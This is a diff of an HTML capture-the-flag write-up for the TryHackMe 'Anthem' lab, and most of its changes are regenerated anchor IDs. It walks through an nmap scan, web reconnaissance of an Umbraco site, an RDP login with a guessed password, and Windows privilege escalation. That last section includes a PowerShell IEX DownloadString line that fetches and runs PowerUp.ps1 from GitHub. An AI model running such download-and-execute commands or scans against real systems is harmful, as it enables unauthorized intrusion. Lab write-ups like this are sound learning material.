@@ -23,20 +23,20 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orgede0cda">Reconnaissance</a>
+<li><a href="#orga468fb9">Reconnaissance</a>
 <ul>
-<li><a href="#org92edd9a">Port Scanning</a></li>
-<li><a href="#org2fa51f3">Web Analysis</a>
+<li><a href="#orgabce850">Port Scanning</a></li>
+<li><a href="#org52cf911">Web Analysis</a>
 <ul>
-<li><a href="#orgcdaf033">Random Findings</a></li>
-<li><a href="#org690c41f">Robots.txt, Security.txt, Sitemap.xml</a></li>
-<li><a href="#orgba02291">Finding the administrator</a></li>
+<li><a href="#orgafe56ac">Random Findings</a></li>
+<li><a href="#org61e174d">Robots.txt, Security.txt, Sitemap.xml</a></li>
+<li><a href="#org2047eaf">Finding the administrator</a></li>
 </ul>
 </li>
 </ul>
 </li>
-<li><a href="#org9509bfb">Trying RDP out</a></li>
-<li><a href="#org1584fec">Privilege Escalation</a></li>
+<li><a href="#orgd7be991">Trying RDP out</a></li>
+<li><a href="#orgd43e1f4">Privilege Escalation</a></li>
 </ul>
 </div>
 </div>
@@ -45,23 +45,23 @@ After a long time of not messing around with any CTFs, I decided to
 give <a href="https://tryhackme.com/room/anthem">anthem</a> a shot and see how far I could go on my own. 
 </p>
 
-<div id="outline-container-orgede0cda" class="outline-2">
-<h2 id="orgede0cda"><a href="#orgede0cda">Reconnaissance</a></h2>
-<div class="outline-text-2" id="text-orgede0cda">
+<div id="outline-container-orga468fb9" class="outline-2">
+<h2 id="orga468fb9"><a href="#orga468fb9">Reconnaissance</a></h2>
+<div class="outline-text-2" id="text-orga468fb9">
 </div>
-<div id="outline-container-org92edd9a" class="outline-3">
-<h3 id="org92edd9a"><a href="#org92edd9a">Port Scanning</a></h3>
-<div class="outline-text-3" id="text-org92edd9a">
+<div id="outline-container-orgabce850" class="outline-3">
+<h3 id="orgabce850"><a href="#orgabce850">Port Scanning</a></h3>
+<div class="outline-text-3" id="text-orgabce850">
 <p>
 First things first, let&rsquo;s try to get some information about the target
 machine, checking all ports and saving the output for future use:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org78ce1d0">sudo nmap -sSV -p- 10.10.201.121 -oA nmap.out -T4
+<pre class="src src-bash" id="org29a449c">sudo nmap -sSV -p- 10.10.201.121 -oA nmap.out -T4
 </pre>
 </div>
 
-<pre class="example" id="orgd800047">
+<pre class="example" id="orgbb71bbd">
 Starting Nmap 7.60 ( https://nmap.org ) at 2023-10-21 08:34 BST
 Nmap scan report for ip-10-10-201-121.eu-west-1.compute.internal (10.10.201.121)
 Host is up (0.00045s latency).
@@ -92,9 +92,9 @@ Getting some more information from the web server can not hurt.
 </div>
 </div>
 
-<div id="outline-container-org2fa51f3" class="outline-3">
-<h3 id="org2fa51f3"><a href="#org2fa51f3">Web Analysis</a></h3>
-<div class="outline-text-3" id="text-org2fa51f3">
+<div id="outline-container-org52cf911" class="outline-3">
+<h3 id="org52cf911"><a href="#org52cf911">Web Analysis</a></h3>
+<div class="outline-text-3" id="text-org52cf911">
 <p>
 I always like to use burp suite (or zap for that matter), when I first
 start interacting with a website. It saves me the trouble of manually
@@ -112,7 +112,7 @@ what Burp stores, making for a relatively clutter-free environment</li>
 <li class="on"><code>[X]</code> Start moving</li>
 </ul>
 
-<div class="note" id="orgf94c7db">
+<div class="note" id="org9b6e8a9">
 <p>
 Using <a href="https://github.com/hakluke/hakrawler">https://github.com/hakluke/hakrawler</a> while passing all the
 traffic through Burp&rsquo;s proxy might also be beneficial, but at this
@@ -122,9 +122,9 @@ point I like manually checking every page.
 </div>
 </div>
 
-<div id="outline-container-orgcdaf033" class="outline-4">
-<h4 id="orgcdaf033"><a href="#orgcdaf033">Random Findings</a></h4>
-<div class="outline-text-4" id="text-orgcdaf033">
+<div id="outline-container-orgafe56ac" class="outline-4">
+<h4 id="orgafe56ac"><a href="#orgafe56ac">Random Findings</a></h4>
+<div class="outline-text-4" id="text-orgafe56ac">
 <p>
 While randomly clicking everywhere I could find, I got to the page of
 a writer (Jane Doe), which included a flag at a suspiciously obvious
@@ -132,7 +132,7 @@ location.
 </p>
 
 
-<div id="orgec7b62d" class="figure">
+<div id="orga7ebf6e" class="figure">
 <p><img src="Reconnaissance/20231021_105049_screenshot.png" alt="20231021_105049_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 1: </span>A flag :P</p>
@@ -141,9 +141,9 @@ location.
 </div>
 
 
-<div id="outline-container-org690c41f" class="outline-4">
-<h4 id="org690c41f"><a href="#org690c41f">Robots.txt, Security.txt, Sitemap.xml</a></h4>
-<div class="outline-text-4" id="text-org690c41f">
+<div id="outline-container-org61e174d" class="outline-4">
+<h4 id="org61e174d"><a href="#org61e174d">Robots.txt, Security.txt, Sitemap.xml</a></h4>
+<div class="outline-text-4" id="text-org61e174d">
 <p>
 Visiting those files is a must when checking websites (even though the
 writer might occasionally forget about them), and <code>robots.txt</code> did not
@@ -152,14 +152,14 @@ target host uses the Umbraco CMS, and it&rsquo;s sign-in page is also revealed.
 </p>
 
 
-<div id="orgcda80a4" class="figure">
+<div id="orgb047ef8" class="figure">
 <p><img src="Reconnaissance/20231021_105217_screenshot.png" alt="20231021_105217_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 2: </span>Robots.txt contents</p>
 </div>
 
 
-<div id="orgdad95b1" class="figure">
+<div id="org64e2a0f" class="figure">
 <p><img src="Reconnaissance/20231021_105556_screenshot.png" alt="20231021_105556_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 3: </span>Umbraco Sign-in Page</p>
@@ -172,9 +172,9 @@ lacking any information.
 </div>
 </div>
 
-<div id="outline-container-orgba02291" class="outline-4">
-<h4 id="orgba02291"><a href="#orgba02291">Finding the administrator</a></h4>
-<div class="outline-text-4" id="text-orgba02291">
+<div id="outline-container-org2047eaf" class="outline-4">
+<h4 id="org2047eaf"><a href="#org2047eaf">Finding the administrator</a></h4>
+<div class="outline-text-4" id="text-org2047eaf">
 <p>
 At this point we have a lot of information about the target system,
 yet no information on the administrator (other than the contents of an
@@ -190,14 +190,14 @@ miss anything).
 </p>
 
 
-<div id="org8a6fa65" class="figure">
+<div id="org481f6e6" class="figure">
 <p><img src="Reconnaissance/20231021_105932_screenshot.png" alt="20231021_105932_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 4: </span>Another random flag found during this stage</p>
 </div>
 
 
-<div id="orgf8f1ea2" class="figure">
+<div id="org5663433" class="figure">
 <p><img src="Reconnaissance/20231021_110055_screenshot.png" alt="20231021_110055_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 5: </span>Another random flag</p>
@@ -211,7 +211,7 @@ had bothered changing them:
 </p>
 
 
-<div id="org2781029" class="figure">
+<div id="org2db9d3e" class="figure">
 <p><img src="Reconnaissance/20231021_110556_screenshot.png" alt="20231021_110556_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 6: </span>No luck</p>
@@ -246,23 +246,23 @@ Jane Doe translates to jd.</li>
 </div>
 </div>
 
-<div id="outline-container-org9509bfb" class="outline-2">
-<h2 id="org9509bfb"><a href="#org9509bfb">Trying RDP out</a></h2>
-<div class="outline-text-2" id="text-org9509bfb">
+<div id="outline-container-orgd7be991" class="outline-2">
+<h2 id="orgd7be991"><a href="#orgd7be991">Trying RDP out</a></h2>
+<div class="outline-text-2" id="text-orgd7be991">
 <p>
 We now know the administrator&rsquo;s username, and we have a potential
 password, so checking RDP out seems like a good choice: it was.
 </p>
 
 
-<div id="org91448d7" class="figure">
+<div id="orgaa5ecd5" class="figure">
 <p><img src="Trying_RDP_out/20231021_112003_screenshot.png" alt="20231021_112003_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 7: </span>Got the root flag</p>
 </div>
 
 
-<div class="note" id="org3569e90">
+<div class="note" id="org2d04e69">
 <p>
 After answering the questions on THM I realized that I had missed one,
 presumably hidden within the source code, nice 
@@ -271,7 +271,7 @@ presumably hidden within the source code, nice
 </div>
 
 
-<div id="org2b669bc" class="figure">
+<div id="org40fc6f1" class="figure">
 <p><img src="Trying_RDP_out/20231021_112223_screenshot.png" alt="20231021_112223_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 8: </span>Completing the last web flag</p>
@@ -279,16 +279,16 @@ presumably hidden within the source code, nice
 </div>
 </div>
 
-<div id="outline-container-org1584fec" class="outline-2">
-<h2 id="org1584fec"><a href="#org1584fec">Privilege Escalation</a></h2>
-<div class="outline-text-2" id="text-org1584fec">
+<div id="outline-container-orgd43e1f4" class="outline-2">
+<h2 id="orgd43e1f4"><a href="#orgd43e1f4">Privilege Escalation</a></h2>
+<div class="outline-text-2" id="text-orgd43e1f4">
 <p>
 Having limited experience with windows, I relied heavily on
 <a href="https://swisskyrepo.github.io/">PayloadsAllTheThings</a>, testing this first:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-powershell" id="orgc8d186a">bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); 
+<pre class="src src-powershell" id="org32c0258">bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); 
 </pre>
 </div>
 
@@ -312,7 +312,7 @@ properties so that I could open it properly:
 </p>
 
 
-<div id="org6505142" class="figure">
+<div id="orgc7662f4" class="figure">
 <p><img src="Privilege_Escalation/20231021_113902_screenshot.png" alt="20231021_113902_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 9: </span>Got a password-like string</p>
@@ -329,7 +329,7 @@ Seems like a good combination to choose, so I try to view
 </p>
 
 
-<div id="org5311f23" class="figure">
+<div id="orgb6ee61f" class="figure">
 <p><img src="Privilege_Escalation/20231021_114259_screenshot.png" alt="20231021_114259_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 10: </span>Final Flag</p>
